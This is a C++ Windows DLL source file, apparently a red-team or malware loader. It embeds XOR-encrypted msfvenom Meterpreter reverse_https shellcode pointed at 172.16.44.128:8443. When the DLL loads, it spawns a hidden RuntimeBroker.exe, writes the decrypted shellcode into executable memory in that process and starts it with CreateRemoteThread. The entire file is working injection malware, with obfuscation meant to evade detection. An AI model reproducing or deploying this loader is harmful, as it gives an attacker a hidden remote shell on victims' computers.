// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include <windows.h>

// Xor key
unsigned char key[] = "key1337";

// Key length
int keyLen = 7;

// Xor encrypted shellcode
// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.44.128 LPORT=8443 EXITFUNC=process -f c --encrypt xor --encrypt-key key1337 -b \x00\x0a\x0d
unsigned char buf[] =
"\x23\x54\xb0\x79\xb2\xda\x99\x94\x9a\x86\x79\xbe\x36\xd8\x94"
"\x9a\x86\x79\x88\xaa\xc3\xd6\xd7\xb0\x86\x93\x70\x7f\x5a\x3d"
"\x5e\x79\x1e\xcb\xc8\x94\x9a\x9b\xc5\x56\x8f\x09\x3d\x5c\x26"
"\x5d\x70\xaa\xc3\x97\x86\xf1\xd6\xc1\x21\xf8\xd7\xe9\x19\x9d"
"\xcc\x18\x26\x92\xd9\x4f\xd1\xe2\xcc\x1c\x7a\xdc\xc5\x83\x36"
"\xb0\xca\x83\xad\x92\x95\xc3\xb0\x37\x94\xf4\xfa\x04\xfb\xef"
"\xf9\xa0\xfe\xf9\x33\x6b\x0e\x87\x98\xad\x0f\x73\x9d\xf8\x82"
"\x87\x9f\x3b\xd4\xb3\xfb\xec\xa3\x90\xca\x28\xe2\x12\x0c\xea"
"\x9a\xc6\x8c\x7f\xf6\x97\x28\xfc\x06\x0c\x09\xfa\x80\xcb\x6e"
"\x65\x05\xfa\xe6\xb6\xdd\x15\xb1\xe0\xdf\xca\x0e\xe2\xf2\x89"
"\x3b\xab\x17\x69\x8f\xe1\xff\x58\x38\x55\x0a\x97\x5c\x84\x0e"
"\xdb\x71\x78\xd7\xe9\x0b\xb9\x45\x5a\x79\x5e\xd0\xc5\x42\xc2"
"\x64\xe2\xd9\xb0\x8e\xc0\xa5\xf2\xc5\xf2\xf7\x95\x1d\xd6\xc5"
"\x75\x9c\xe1\x73\xa9\x17\xe8\xc4\x29\xde\x91\x36\x21\x87\x96"
"\x90\xad\x1e\xd0\xfb\xae\x4b\x9e\xd6\x60\xc7\xcb\x31\xf6\xc1"
"\x81\x91\xb9\xdc\xd2\x2d\xb3\xcb\x8c\x00\x16\xa4\xd6\x7a\x03"
"\x6d\xd4\xc0\xa3\xda\x83\xad\xf2\x2c\xc5\x7e\x01\x23\x98\x72"
"\x99\x1c\xdd\xcc\x1c\xa5\xb0\x1c\xc3\xa9\xef\xad\xac\x8f\xc7"
"\x38\x23\x22\x9f\x10\x72\xca\xe4\x56\xa9\x60\x0d\x98\xab\xcc"
"\x1a\x95\xa1\xcb\x89\xb2\x3a\xc9\xa6\xe1\xaf\xde\xc5\x3b\xc0"
"\xd6\xb2\x81\xe0\xc5\x8e\x81\x01\x09\x2d\x34\xa8\xc7\x8e\xb4"
"\x95\xe0\xf7\x43\x9c\xe9\xbe\xed\x82\xff\xa3\x48\xaa\x99\x9e"
"\x5e\x71\xcf\x54\xb0\x55\xbf\xd8\xcb\xb5\xb5\x5a\x27\xa1\xfb"
"\xc7\xd0\xb3\x3e\xc0\xa1\x63\x4b\x8c\x81\xfa\x80\x34\xf3\x08"
"\xa6\x8e\x81\xfe\xf3\x81\x59\xdc\x9d\xd8\xdc\xdb\xa5\xba\x3d"
"\xf3\x83\xc8\xbe\xe5\x8b\xc8\x47\xed\xfb\x84\xb0\xc8\xcd\xe3"
"\x01\xc3\xfb\xf5\xb1\x9f\xe0\xa7\x44\x94\xf9\x81\xae\x99\xbd"
"\xa0\x65\x98\xc1\xc9\xe8\x9c\xe4\xba\x0b\xaa\xaf\xb8\xf5\x92"
"\xb8\xaf\x51\x90\x93\xfe\xf5\x93\xba\xba\x3a\xd9\xf0\xe1\x97"
"\xee\xa9\xf8\x46\xec\x8e\x94\x81\xe0\xcd\xc5\x1d\x9b\xaa\x9e"
"\xa4\xb9\xe3\xd6\x22\xc2\xf8\xae\xf5\xd7\xc0\xc1\x28\xb4\x04"
"\x4d\xd2\xa0\xc1\x93\x6b\xd1\x0c\xdd\xc9\x46\xdc\xf7\x92\x2c"
"\xc7\x8e\x85\xa2\x82\x8a\x21\xe3\x00\x48\x32\xf9\xe0\xaa\x8f"
"\x7f\x8b\x5f\x11\xda\x8c\xcc\x38\x27\x6e\xb2\xd4\xa2\xd6\xfb"
"\xf4\xc1\x91\xc4\xca\x73\x64\xfd\x2c\xbd\xd4\xc5\x3b\x8f\xc6"
"\x55\xa0\xe0\xc5\x8e\x81\x01\x09\x88\x0b\x68\x94\xd4\xcd\x2b"
"\x23\x94\x43\x63\x8a\xbb\x10\xff\x9d\xd8\xb7\x68\xee\xd0\xcf"
"\xcb\x79\x46\xf5\x6e\xea\xc7\x83\x3f\x45\x1b\x67\xf2\x91\x8d"
"\x39\xbe\x74\xa2\xc8\xfc\x8d\x8c\x81\x05\x55\x83\xd9\x2f\xb1"
"\x8c\x6a\x54\x34\x90\x3a\xa8\xc7\xdd\xdc\xc8\x92\x83\x3b\x23"
"\x16\x4b\x3b\xbc\x87\x56\xb0\xaa\xd3\xd6\xd7\xf9\x3c\xcb\xd4"
"\xfd\x7a\xd8\xcb\xf8\x84\x6c\xa1\xba\x02\x97\xd0\xb2\x0d\x70"
"\x60\x75\x7c\xc4\x08\x20\xc9\x0c\xe6\xe0\xe5\x8e\x81\xb7\x55"
"\x3c\x73\x12\xd5\x18\x0c\x40\xd2\xd9\x72\xaa\x38\x5f\x91\x2f"
"\x0a\xb1\xf5\x6a\xb7\x64\xb1\x3b\x81\xdb\x71\x6d\x1a\x18\xbe"
"\x2a\xdc\x50\x2c\x98\x91\x9d\xca\x3d\x46\x67\x9d\x5e\xdb\x73"
"\x54\xfa\x80\xcb\x26";

// Shellcode length
int bufLen = 695;

// Xor function to decrypt shellcode with the key
void Xor(unsigned char* buf, int* bufLen, unsigned char* key, int* keyLen)
{
    for (int i = 0; i < *bufLen; i++)
    {
        buf[i] = buf[i] ^ key[i % *keyLen];
    }
}

BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,  // Handle to DLL module
    DWORD fdwReason,     // Reason for calling function
    LPVOID lpReserved)  // Reserved
{
    // Create a new thread on process attach
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        LPVOID remoteBuf;
        SIZE_T remoteBuf_size = sizeof(buf);
        LPCSTR cmd;
        HANDLE remoteThread;

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);

        // Make sure there is no window for the new process
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        cmd = "C:\\Windows\\System32\\RuntimeBroker.exe"; // Program to host the shellcode
        char args[] = ""; // command line arguments (start with a space), leave empty if you don't need any arguments

        // Preate a new process, with a hidden window
        if (CreateProcess(
            cmd,							// Executable
            args,							// Command line arguments
            NULL,							// Process handle not inheritable
            NULL,							// Thread handle not inheritable
            FALSE,							// Set handle inheritance to FALSE
            CREATE_NO_WINDOW,	            // Do Not Open a Window
            NULL,							// Use parent's environment block
            NULL,							// Use parent's starting directory 
            &si,			                // Pointer to STARTUPINFO structure
            &pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
        )) {
            // Allow cmd 1 second to start/initialize.
            WaitForSingleObject(pi.hProcess, 1000);

            // Create an executeable buffer for the remote thread
            remoteBuf = VirtualAllocEx(pi.hProcess, NULL, remoteBuf_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Decrypt the shellcode
            Xor(&buf[0], &bufLen, &key[0], &keyLen);

            // Write the shellcode into the memory of the remote process
            WriteProcessMemory(pi.hProcess, remoteBuf, buf, remoteBuf_size, NULL);

            // Preate a thread on the remote process, in a suspended state
            remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, CREATE_SUSPENDED, 0);

            // Resume the remote thread
            ResumeThread(remoteThread);
        }
    }
    return TRUE;
}
